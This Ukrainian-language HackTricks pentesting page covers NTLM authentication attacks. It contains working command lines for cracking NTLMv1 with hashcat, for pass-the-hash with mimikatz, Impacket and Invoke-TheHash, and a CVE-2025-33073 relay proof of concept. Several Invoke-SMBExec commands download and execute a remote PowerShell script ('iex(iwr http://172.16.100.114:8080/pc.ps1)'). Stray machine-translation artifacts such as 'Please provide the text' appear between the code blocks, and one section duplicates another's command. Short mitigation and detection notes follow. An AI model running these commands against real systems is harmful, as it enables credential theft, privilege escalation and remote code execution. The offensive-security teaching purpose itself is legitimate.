# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Основна інформація

У середовищах, де працюють **Windows XP і Server 2003**, використовуються хеші LM (Lan Manager), хоча загальновідомо, що їх можна легко скомпрометувати. Певний хеш LM, `AAD3B435B51404EEAAD3B435B51404EE`, вказує на те, що LM не використовується, і є хешем порожнього рядка.

За замовчуванням основним методом є протокол автентифікації **Kerberos**. NTLM (NT LAN Manager) використовується за певних обставин: за відсутності Active Directory, якщо домен не існує, у разі несправності Kerberos через неправильну конфігурацію або коли підключення здійснюються за IP-адресою, а не за дійсним іменем хоста.

Наявність заголовка **"NTLMSSP"** у мережевих пакетах сигналізує про процес автентифікації NTLM.

Підтримка протоколів автентифікації - LM, NTLMv1 і NTLMv2 - забезпечується певною DLL, розташованою за адресою `%windir%\Windows\System32\msv1\_0.dll`.

**Ключові моменти**:

- Хеші LM є вразливими, а порожній хеш LM (`AAD3B435B51404EEAAD3B435B51404EE`) означає, що LM не використовується.
- Kerberos є методом автентифікації за замовчуванням, а NTLM використовується лише за певних умов.
- Пакети автентифікації NTLM можна ідентифікувати за заголовком "NTLMSSP".
- Протоколи LM, NTLMv1 і NTLMv2 підтримуються системним файлом `msv1\_0.dll`.

## LM, NTLMv1 і NTLMv2

Можна перевірити та налаштувати протокол, який буде використовуватися:

### GUI

Виконайте _secpol.msc_ -> Локальні політики -> Параметри безпеки -> Мережева безпека: рівень автентифікації LAN Manager. Існує 6 рівнів (від 0 до 5).

![LM, NTLMv1 і NTLMv2 - GUI: виконання secpol.msc - Локальні політики - Параметри безпеки - Мережева безпека: рівень автентифікації LAN Manager. Існує 6 рівнів (від 0 до 5)](<../../images/image (919).png>)

### Реєстр

Це встановить рівень 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Можливі значення:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Базова схема автентифікації домену NTLM

1. **користувач** вводить свої **облікові дані**
2. Клієнтська машина **надсилає запит на автентифікацію**, передаючи **ім’я домену** та **ім’я користувача**
3. **Сервер** надсилає **challenge**
4. **Клієнт шифрує** **challenge**, використовуючи хеш пароля як ключ, і надсилає його як response
5. **Сервер надсилає** до **контролера домену** **ім’я домену, ім’я користувача, challenge і response**. Якщо **Active Directory** не налаштовано або ім’я домену збігається з іменем сервера, облікові дані **перевіряються локально**.
6. **Контролер домену перевіряє, чи все правильно**, і надсилає інформацію на сервер

**Сервер** і **контролер домену** можуть створити **Secure Channel** через сервер **Netlogon**, оскільки контролер домену знає пароль сервера (він міститься в БД **NTDS.DIT**).

### Схема локальної автентифікації NTLM

Автентифікація відбувається так само, як описано **вище, але** **сервер** знає **хеш користувача**, який намагається автентифікуватися, у файлі **SAM**. Тому замість звернення до контролера домену **сервер сам перевіряє**, чи може користувач автентифікуватися.

### NTLMv1 Challenge

**Довжина challenge становить 8 байтів**, а **response** має довжину 24 байти.

**NT-хеш (16 байтів)** ділиться на **3 частини по 7 байтів кожна** (7B + 7B + (2B+0x00\*5)): **остання частина заповнюється нулями**. Потім **challenge** шифрується окремо кожною частиною, а **отримані** зашифровані байти **об’єднуються**. Усього: 8B + 8B + 8B = 24 байти.

**Проблеми**:

- Відсутність **випадковості**
- 3 частини можна **атакувати окремо**, щоб отримати NT-хеш
- **DES можна зламати**
- 3-й ключ завжди складається з **5 нулів**.
- За умови **однакового challenge** **response** буде **однаковим**. Тому ви можете передати жертві як **challenge** рядок "**1122334455667788**" і атакувати response, використовуючи **попередньо обчислені rainbow tables**.

### Атака на NTLMv1

Сьогодні дедалі рідше трапляються середовища з налаштованою Unconstrained Delegation, але це не означає, що ви не можете **зловживати сервісом Print Spooler**, який налаштований.

Ви можете зловжити деякими обліковими даними/сесіями, які вже маєте в AD, щоб **попросити принтер автентифікуватися** на **хості під вашим контролем**. Потім за допомогою `metasploit auxiliary/server/capture/smb` або `responder` можна **встановити challenge автентифікації на 1122334455667788**, перехопити спробу автентифікації, і якщо вона виконувалася з використанням **NTLMv1**, ви зможете **зламати її**.\
Якщо ви використовуєте `responder`, можна спробувати **використати прапорець `--lm`**, щоб спробувати **понизити версію** **автентифікації**.\
_Зверніть увагу, що для цієї техніки автентифікація має виконуватися з використанням NTLMv1 (NTLMv2 не підходить)._

Пам’ятайте, що під час автентифікації принтер використовуватиме обліковий запис комп’ютера, а облікові записи комп’ютерів використовують **довгі та випадкові паролі**, які ви, **ймовірно, не зможете зламати** за допомогою звичайних **словників**. Але автентифікація **NTLMv1** **використовує DES** ([більше інформації тут](#ntlmv1-challenge)), тому за допомогою деяких сервісів, спеціально призначених для злому DES, ви зможете зламати його (наприклад, можна використати [https://crack.sh/](https://crack.sh) або [https://ntlmv1.com/](https://ntlmv1.com)).

### Атака на NTLMv1 за допомогою hashcat

NTLMv1 також можна зламати за допомогою NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), який форматує повідомлення NTLMv1 у методі, що можна зламати за допомогою hashcat.<sup>[[1]](#references)</sup>

Команда
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Будь ласка, надайте текст для перекладу.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to put in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Запустіть hashcat (розподілене виконання найкраще організувати через такий інструмент, як hashtopolis), оскільки в іншому разі це займе кілька днів.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
У цьому випадку ми знаємо, що пароль — password, тому для демонстрації скористаємося хитрощами:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Тепер нам потрібно використати hashcat-utilities, щоб перетворити зламані ключі des на частини NTLM hash:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Нарешті, остання частина:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the text to combine and translate.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Довжина challenge становить 8 байтів**, і надсилаються **2 responses**: один має довжину **24 байти**, а довжина **іншого** є **змінною**.

**Перший response** створюється шляхом шифрування за допомогою **HMAC_MD5** **рядка**, складеного з **client і domain**, із використанням як **ключа** **хешу MD4** від **NT hash**. Потім **результат** використовується як **ключ** для шифрування за допомогою **HMAC_MD5** **challenge**. До нього додається **client challenge** довжиною 8 байтів. Усього: 24 B.

**Другий response** створюється з використанням **кількох значень** (нового client challenge, **timestamp**, щоб запобігти **replay attacks**...)

Якщо у вас є **pcap**, у якому зафіксовано успішний процес автентифікації, ви можете скористатися цим посібником, щоб отримати domain, username, challenge і response та спробувати зламати пароль: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Отримавши хеш жертви**, ви можете використати його, щоб **імперсонувати** її.\
Потрібно використати **tool**, який **виконає** **NTLM authentication за допомогою** цього **хешу**, **або** можна створити новий **sessionlogon** і **інжектити** цей **хеш** у **LSASS**, щоб під час виконання будь-якої **NTLM authentication** використовувався **цей хеш**. Саме це робить mimikatz.

**Пам’ятайте, що Pass-the-Hash attacks можна також виконувати за допомогою Computer accounts.**

### **Mimikatz**

**Потрібно запускати від імені адміністратора**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Це запустить процес, який належатиме користувачеві, що запустив mimikatz, але внутрішньо в LSASS збережені облікові дані будуть тими, що вказані в параметрах mimikatz. Після цього ви зможете отримувати доступ до мережевих ресурсів так, ніби ви є цим користувачем (аналогічно трюку `runas /netonly`, але вам не потрібно знати пароль у plaintext).

### Pass-the-Hash з linux

Ви можете отримати виконання коду на машинах Windows, використовуючи Pass-the-Hash з Linux.\
[**Перейдіть сюди, щоб дізнатися, як це зробити.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Скомпільовані інструменти Impacket для Windows

Ви можете завантажити[ бінарні файли impacket для Windows тут](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (У цьому випадку потрібно вказати команду; cmd.exe та powershell.exe не підходять для отримання інтерактивної оболонки)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Є ще кілька бінарних файлів Impacket...

### Invoke-TheHash

Ви можете отримати PowerShell-скрипти тут: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Ця функція є **поєднанням усіх інших**. Ви можете передати **кілька хостів**, **виключити** деякі з них і **вибрати** потрібну **опцію** (_SMBExec, WMIExec, SMBClient, SMBEnum_). Якщо ви виберете **SMBExec** або **WMIExec**, але **не вкажете** параметр _**Command**_, функція лише **перевірить**, чи маєте ви **достатньо дозволів**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Потрібно запускати від імені адміністратора**

Цей інструмент робить те саме, що й mimikatz (модифікує пам’ять LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ручне віддалене виконання Windows з іменем користувача та паролем


{{#ref}}
../lateral-movement/
{{#endref}}

## Вилучення облікових даних із Windows Host

**Докладніше про** [**отримання облікових даних із Windows Host читайте на цій сторінці**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Internal Monologue Attack — це прихована техніка вилучення облікових даних, яка дає змогу зловмиснику отримувати NTLM hashes із машини жертви **без прямої взаємодії з процесом LSASS**. На відміну від Mimikatz, який безпосередньо зчитує hashes із пам’яті та часто блокується endpoint security solutions або Credential Guard, ця атака використовує **локальні виклики пакета автентифікації NTLM (MSV1_0) через Security Support Provider Interface (SSPI)**. Спочатку зловмисник **понижує налаштування NTLM** (наприклад, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), щоб дозволити NetNTLMv1. Потім він імітує наявні user tokens, отримані від запущених процесів, і локально запускає NTLM authentication для генерації відповідей NetNTLMv1 з використанням відомого challenge.<sup>[[4]](#references)</sup>

Після перехоплення цих відповідей NetNTLMv1 зловмисник може швидко відновити оригінальні NTLM hashes за допомогою **попередньо обчислених rainbow tables**, що дає змогу виконувати подальші Pass-the-Hash атаки для lateral movement. Важливо, що Internal Monologue Attack залишається прихованою, оскільки не створює мережевого трафіку, не впроваджує code і не запускає прямі memory dumps, тому її складніше виявити захисникам порівняно з традиційними методами, такими як Mimikatz.

Якщо NetNTLMv1 не приймається через застосування security policies, зловмиснику може не вдатися отримати відповідь NetNTLMv1.

Для цього випадку Internal Monologue tool було оновлено: він динамічно отримує server token за допомогою `AcceptSecurityContext()`, щоб у разі помилки NetNTLMv1 все одно **перехоплювати відповіді NetNTLMv2**. Хоча NetNTLMv2 набагато складніше crack, він усе ще відкриває шлях для relay атак або offline brute-force у певних випадках.

PoC можна знайти в **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay і Responder

**Докладніший guide щодо виконання цих атак наведено тут:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Парсинг NTLM challenges із network capture

**Ви можете використати** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM і Kerberos *Reflection* через Serialized SPNs (CVE-2025-33073)

Windows містить кілька mitigation механізмів, які намагаються запобігати *reflection* attacks, коли NTLM (або Kerberos) authentication, що походить від host, relayed назад на **той самий** host для отримання SYSTEM privileges.

Microsoft усунула більшість public chains за допомогою MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) і подальших patches, однак **CVE-2025-33073** демонструє, що protections усе ще можна обійти, зловживаючи тим, як **SMB client truncates Service Principal Names (SPNs)**, що містять *marshalled* (serialized) target-info.<sup>[[5]](#references)[[6]](#references)</sup>

### Коротко про bug
1. Зловмисник реєструє **DNS A-record**, label якого містить marshalled SPN — наприклад,
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Victim змушують автентифікуватися до цього hostname (PetitPotam, DFSCoerce тощо).
3. Коли SMB client передає target string `cifs/srv11UWhRCAAAAA…` до `lsasrv!LsapCheckMarshalledTargetInfo`, виклик `CredUnmarshalTargetInfo` **видаляє** serialized blob, залишаючи **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (або еквівалент Kerberos) тепер вважає target *localhost*, оскільки коротка частина host відповідає імені computer (`SRV1`).
5. У результаті server встановлює `NTLMSSP_NEGOTIATE_LOCAL_CALL` і впроваджує **LSASS’ SYSTEM access-token** у context (для Kerberos створюється subsession key із позначкою SYSTEM).
6. Relaying цієї authentication за допомогою `ntlmrelayx.py` **або** `krbrelayx.py` надає повні SYSTEM rights на тому самому host.<sup>[[5]](#references)</sup>

### Швидкий PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Виправлення та заходи пом'якшення
* KB patch для **CVE-2025-33073** додає перевірку в `mrxsmb.sys::SmbCeCreateSrvCall`, яка блокує будь-яке SMB-з'єднання, ціль якого містить marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Увімкніть **SMB signing**, щоб запобігти reflection навіть на host без patch.
* Відстежуйте DNS-записи, схожі на `*<base64>...*`, і блокуйте coercion vectors (PetitPotam, DFSCoerce, AuthIP...).

### Ідеї для виявлення
* Network captures із `NTLMSSP_NEGOTIATE_LOCAL_CALL`, де IP клієнта ≠ IP сервера.
* Kerberos AP-REQ, що містить subsession key, і client principal, який дорівнює hostname.
* Windows Event 4624/4648 SYSTEM logons, після яких одразу виконуються remote SMB writes з того самого host.<sup>[[5]](#references)</sup>

Щодо **March 2026** local reflection variant, яка використовує **SMB arbitrary ports** і **TCP connection reuse** для отримання `NT AUTHORITY\SYSTEM`, дивіться:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Cracking an NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
